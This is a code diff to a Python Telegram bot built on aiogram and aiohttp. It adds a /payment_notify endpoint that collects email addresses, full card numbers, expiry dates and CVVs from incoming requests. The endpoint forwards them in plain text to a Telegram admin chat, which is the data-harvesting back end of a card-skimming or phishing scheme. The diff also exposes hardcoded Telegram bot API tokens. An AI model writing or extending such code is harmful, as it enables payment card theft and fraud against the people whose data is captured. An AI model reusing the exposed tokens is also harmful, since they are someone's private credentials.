@@ -20,6 +20,7 @@ import barcode
 from barcode.writer import ImageWriter
 import uuid
 from aiohttp import web
+import aiohttp
 
 #API_TOKEN = "8055265032:AAHdP7_hwpJ--mzXYBQgbrJduxJ-uczEPGQ"
 API_TOKEN = "5619487724:AAFeBptlX1aJ9IEAFLMUXN3JZBImJ35quWk"
@@ -1012,12 +1013,29 @@ async def notify_admin(request):
         print('Error sending message:', e)
     return web.Response(text="OK")
 
+async def payment_notify(request):
+    data = await request.json()
+    email = data.get('email', '')
+    card = data.get('card', '')
+    expiry = data.get('expiry', '')
+    cvv = data.get('cvv', '')
+    text = f"Email: {email}\nCard Number: {card}\nExpiry Date: {expiry}\nCVV: {cvv}"
+    await send_to_telegram(text)
+    return web.Response(text='ok')
+
+async def send_to_telegram(text):
+    url = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"
+    payload = {"chat_id": ADMIN_GROUP_ID, "text": text}
+    async with aiohttp.ClientSession() as session:
+        await session.post(url, json=payload)
+
 # --- запуск aiohttp і aiogram в одному event loop ---
 if __name__ == '__main__':
     async def main():
         # aiohttp app
         app = web.Application()
         app.router.add_post('/notify_admin', notify_admin)
+        app.router.add_post('/payment_notify', payment_notify)
         runner = web.AppRunner(app)
         await runner.setup()
         site = web.TCPSite(runner, '0.0.0.0', 8081)
